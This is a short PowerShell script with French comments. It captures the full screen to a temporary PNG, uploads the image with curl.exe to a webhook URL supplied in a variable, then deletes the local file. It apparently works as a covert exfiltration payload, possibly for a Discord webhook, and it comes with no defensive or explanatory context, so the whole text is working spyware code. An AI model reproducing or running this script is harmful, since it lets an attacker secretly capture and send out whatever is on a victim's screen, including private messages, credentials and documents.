$hookurl = "$dc"
$seconds = 3 # Intervalle entre les captures d'écran en secondes
$a = 1 # Nombre de captures d'écran à prendre

# Détection de l'URL raccourcie
if ($hookurl.Length -ne 121) {
    Write-Host "URL du webhook raccourcie détectée.." 
    $hookurl = (irm $hookurl).url
}

While ($a -gt 0) {
    $Filett = "$env:temp\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    curl.exe -F "file1=@$filett" $hookurl
    Start-Sleep 1
    Remove-Item -Path $filett
    Start-Sleep $seconds
    $a--
}
